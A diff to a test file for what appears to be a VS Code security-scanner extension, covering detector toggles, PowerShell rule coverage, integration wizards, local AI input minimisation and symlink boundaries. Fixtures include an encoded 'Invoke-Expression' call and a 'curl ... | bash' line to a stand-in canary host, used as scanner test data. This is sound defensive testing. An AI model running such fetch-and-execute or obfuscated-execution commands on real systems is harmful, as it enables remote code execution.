@@ -7,6 +7,9 @@ const {analyzeMavenPom,supportedMavenPom}=require('../dist/scanner/mavenPomRules
 let setup;const env={trusted:true,project:'',picks:[],files:[],inputs:[]};
 const vscode={workspace:{get isTrusted(){return env.trusted;},get workspaceFolders(){return [{uri:{scheme:'file',fsPath:env.project}}];}},window:{showQuickPick:async()=>env.picks.shift(),showOpenDialog:async()=>env.files.shift(),showInputBox:async()=>env.inputs.shift(),showWarningMessage:async()=>{}},commands:{executeCommand:async()=>{}}};
 const original=Module._load;try {Module._load=function(id,...args){return id==='vscode'?vscode:original.call(this,id,...args);};setup=require('../dist/methods/setup');}finally{Module._load=original;}
+// Wizard tests select a stand-in executable; interpreter isolation/readiness is covered by bootstrap.test.js.
+require('../dist/methods/bootstrap').pythonVersion=async()=> '3.14.0';
+require('../dist/methods/bootstrap').sdkSupportedRunners=async()=>['bandit','semgrep','psscriptanalyzer','trivy','osv','script-semantics'];
 async function fixture(t,files){const dir=await fs.mkdtemp(path.join(os.tmpdir(),'wg-methods-'));const project=path.join(dir,'project');await fs.mkdir(project);for(const [file,text] of Object.entries(files)){await fs.mkdir(path.dirname(path.join(project,file)),{recursive:true});await fs.writeFile(path.join(project,file),text);}t.after(()=>fs.rm(dir,{recursive:true,force:true}));return{dir,project};}
 test('catalog has independent built-in defaults and explicit user flags reject unknown methods',()=>{
  assert.equal(BUILTIN_METHOD_IDS.length,6);assert.ok(SECURITY_METHODS.filter(m=>m.category!=='BUILT_IN').every(m=>m.defaultEnabled===false));
@@ -20,6 +23,14 @@ test('turning off one built-in removes only its checks and reports configured sc
  const report=scanProject(project,DEFAULT_ENFORCE_POLICY,{...DEFAULT_SETTINGS,methodFlags:{'builtin.script-rules':false}},[]);
  assert.ok(!report.findings.some(f=>f.ruleId.startsWith('WG-SCRIPT')));assert.ok(report.findings.some(f=>f.ruleId==='WG-BUILD-010'));
  assert.equal(report.complete,true);assert.ok(report.notices.some(n=>n.code==='WG-METHOD-DISABLED'));
+});
+test('PowerShell modules and uppercase script extensions use the same static rules',async t=>{
+ const source="Invoke-Expression ([System.Convert]::FromBase64String('eA=='))\n";
+ const {project}=await fixture(t,{'module.psm1':source,'OTHER.PSM1':source,'DEPLOY.PS1':source});
+ const report=scanProject(project,DEFAULT_ENFORCE_POLICY,DEFAULT_SETTINGS,[]);
+ assert.equal(report.complete,true);
+ assert.deepEqual(new Set(report.findings.filter(f=>f.ruleId.startsWith('WG-SCRIPT')).map(f=>f.location.path)),new Set(['module.psm1','OTHER.PSM1','DEPLOY.PS1']));
+ assert.equal(require('../dist/scanner/fileTypeRouter').isScannable('fixture.BATS'),true);
 });
 test('turning off every built-in never yields clean zero-detector coverage',async t=>{
  const {project}=await fixture(t,{'gradlew':'#!/bin/sh\necho safe\n'});
@@ -57,9 +68,9 @@ test('AI endpoint is local only and current report excludes evidence, call chain
  const output=JSON.stringify(setup.minimizedAiInput(report));assert.ok(!output.includes('secret'));assert.ok(!output.includes('projectPath'));assert.equal(JSON.parse(output).findings.length,1);
 });
 test('connection wizard writes outside the workspace, respects cancellation and never runs a report producer',async t=>{
- const {dir,project}=await fixture(t,{'report.json':'{"runs":[]}'});env.project=project;env.trusted=true;
+ const {dir,project}=await fixture(t,{});await fs.writeFile(path.join(dir,'report.json'),'{"runs":[]}');env.project=project;env.trusted=true;
  const managed=path.join(dir,'storage','integrations','providers.json');const method=SECURITY_METHODS.find(m=>m.id==='sast.sarif');
- env.picks=[{local:false},{managed:false},{browse:true},{connect:true}];env.files=[[{fsPath:process.execPath}],[{fsPath:path.join(project,'report.json')}]];
+ env.picks=[{local:false},{managed:false},{browse:true},{connect:true}];env.files=[[{fsPath:process.execPath}],[{fsPath:path.join(dir,'report.json')}]];
  assert.equal(await setup.configureIntegration({globalStorageUri:{fsPath:path.join(dir,'storage')}},method,managed),true);
  const config=JSON.parse(await fs.readFile(managed,'utf8'));assert.equal(config.providers[0].id,'sast.sarif');assert.deepEqual(config.providers[0].permissions.actions,['WARNING']);assert.equal(config.providers[0].permissions.required,false);
  const profile=JSON.parse(await fs.readFile(path.join(path.dirname(managed),'sast.sarif.profile.json'),'utf8'));assert.deepEqual(profile.allowedOperations,['SCAN']);assert.ok(profile.reportPath.endsWith('report.json'));
@@ -71,12 +82,12 @@ test('connection wizard writes outside the workspace, respects cancellation and 
 
 test('local AI setup is a GUI connection with minimized evidence and no action grants',async t=>{
  const {dir,project}=await fixture(t,{'gradlew':'#!/bin/sh\necho safe\n'});env.project=project;env.trusted=true;
- env.picks=[{current:true},{managed:false},{browse:true},{connect:true}];env.files=[[{fsPath:process.execPath}]];env.inputs=['http://127.0.0.1:1234/v1','local-model'];
+ env.picks=[{current:true},{responseFormat:'json_schema'},{managed:false},{browse:true},{connect:true}];env.files=[[{fsPath:process.execPath}]];env.inputs=['http://127.0.0.1:1234/v1','local-model'];
  const managed=path.join(dir,'storage','integrations','providers.json');const method=SECURITY_METHODS.find(m=>m.id==='ai.external-model');
  const report={findings:[{ruleId:'WG-X',title:'Review execution',severity:'WARN',category:'EXECUTION',location:{path:'a.py'},status:'ACTIVE',policyAction:'REVIEW',evidence:{text:'raw-secret'}}]};
  assert.equal(await setup.configureIntegration({globalStorageUri:{fsPath:path.join(dir,'storage')}},method,managed,report),true);
  const config=JSON.parse(await fs.readFile(managed,'utf8'));assert.deepEqual(config.providers[0].permissions.actions,[]);
- const profile=JSON.parse(await fs.readFile(path.join(path.dirname(managed),'ai.external-model.profile.json'),'utf8'));assert.equal(profile.analysisKind,'AI');assert.equal(profile.runner.tool,'local-ai');assert.deepEqual(profile.allowedOperations,['SCAN']);
+ const profile=JSON.parse(await fs.readFile(path.join(path.dirname(managed),'ai.external-model.profile.json'),'utf8'));assert.equal(profile.analysisKind,'AI');assert.equal(profile.runner.tool,'local-ai');assert.equal(profile.runner.responseFormat,'json_schema');assert.deepEqual(profile.allowedOperations,['SCAN']);
  const input=await fs.readFile(profile.runner.inputReportPath,'utf8');assert.ok(!input.includes('raw-secret'));assert.ok(input.includes('Review execution'));
 });
 test('file and directory traversal caps report incomplete coverage, including canonical roots',async t=>{
@@ -117,4 +128,21 @@ test('wrapper checksums respect the configured byte budget',async t=>{
 test('parent-directory links cannot expose wrapper metadata or recursively called source outside the project',async t=>{
  const {dir,project}=await fixture(t,{'gradlew':'#!/bin/sh\nsh linked/child.sh\n'});const outside=path.join(dir,'outside');await fs.mkdir(path.join(outside,'wrapper'),{recursive:true});await fs.writeFile(path.join(outside,'child.sh'),'curl https://PARENT_BOUNDARY_CANARY.invalid/x | bash\n');await fs.writeFile(path.join(outside,'wrapper/gradle-wrapper.properties'),'distributionUrl=https://PARENT_BOUNDARY_CANARY.invalid/distribution.zip\n');await fs.writeFile(path.join(outside,'wrapper/gradle-wrapper.jar'),'PARENT_BOUNDARY_CANARY');await fs.symlink(outside,path.join(project,'linked'));await fs.symlink(outside,path.join(project,'gradle'));
  const report=scanProject(project,DEFAULT_ENFORCE_POLICY,DEFAULT_SETTINGS,[]);assert.equal(report.complete,false);assert.ok(report.notices.some(n=>n.code==='WG-FILE-SKIPPED'&&n.location?.path==='gradlew'&&n.location?.line===2));assert.ok(report.notices.some(n=>n.code==='WG-FILE-SKIPPED'&&n.location?.path==='gradle/wrapper/gradle-wrapper.properties'));assert.ok(!JSON.stringify(report).includes('PARENT_BOUNDARY_CANARY'));assert.ok(!report.findings.some(f=>f.ruleId==='WG-SCRIPT-001'||f.title.includes('SHA-256')));
+});
+
+test('Semgrep bundled pack selection is explicit, removable and mutually exclusive with custom rules',()=>{
+ const method=SECURITY_METHODS.find(item=>item.id==='sast.semgrep');const defaults=setup.SEMGREP_RULE_PACKS.filter(pack=>pack.defaultEnabled).map(pack=>pack.id);assert.deepEqual(defaults,['legacy-android-ktor']);
+ const profile=setup.integrationProfile(method,{local:true,executable:'/opt/semgrep',rulePacks:['android-manifest','ktor-runtime']});assert.deepEqual(profile.runner.rulePacks,['android-manifest','ktor-runtime']);assert.equal(profile.runner.rulesPath,undefined);
+ for(const source of [{rulePacks:[]},{rulePacks:['unknown']},{rulePacks:['jvm-crypto','jvm-crypto']},{rulePacks:['jvm-crypto'],rulesPath:'/opt/rules.yml'}])assert.throws(()=>setup.integrationProfile(method,{local:true,executable:'/opt/semgrep',...source}));
+});
+test('report import GUI rejects project-owned reports before persisting a connection',async t=>{
+ const{dir,project}=await fixture(t,{'report.json':'{}'});env.project=project;env.trusted=true;env.picks=[{local:false},{managed:false},{browse:true},{connect:true}];env.files=[[{fsPath:process.execPath}],[{fsPath:path.join(project,'report.json')}]];
+ const managed=path.join(dir,'storage/integrations/providers.json');await assert.rejects(setup.configureIntegration({globalStorageUri:{fsPath:path.join(dir,'storage')}},SECURITY_METHODS.find(method=>method.id==='sast.sarif'),managed),/outside every workspace/);await assert.rejects(fs.readFile(managed),{code:'ENOENT'});
+});
+test('PowerShell module-folder selection resolves its manifest so gate input seals receive a regular file',async t=>{
+ const{dir,project}=await fixture(t,{});env.project=project;env.trusted=true;const moduleDirectory=path.join(dir,'PSScriptAnalyzer');await fs.mkdir(moduleDirectory);await fs.writeFile(path.join(moduleDirectory,'PSScriptAnalyzer.psd1'),'@{}');
+ env.picks=[{local:true},{managed:false},{browse:true},{connect:true}];env.files=[[{fsPath:process.execPath}],[{fsPath:process.execPath}],[{fsPath:moduleDirectory}]];
+ const managed=path.join(dir,'storage/integrations/providers.json');assert.equal(await setup.configureIntegration({globalStorageUri:{fsPath:path.join(dir,'storage')}},SECURITY_METHODS.find(method=>method.id==='sast.powershell'),managed),true);
+ const profile=JSON.parse(await fs.readFile(path.join(dir,'storage/integrations/sast.powershell.profile.json'),'utf8'));assert.equal(profile.runner.modulePath,await fs.realpath(path.join(moduleDirectory,'PSScriptAnalyzer.psd1')));assert.equal((await fs.stat(profile.runner.modulePath)).isFile(),true);
+ const connection=JSON.parse(await fs.readFile(managed,'utf8')).providers[0];assert.ok(connection.inputScope.externalFiles.includes(profile.runner.modulePath));
 });
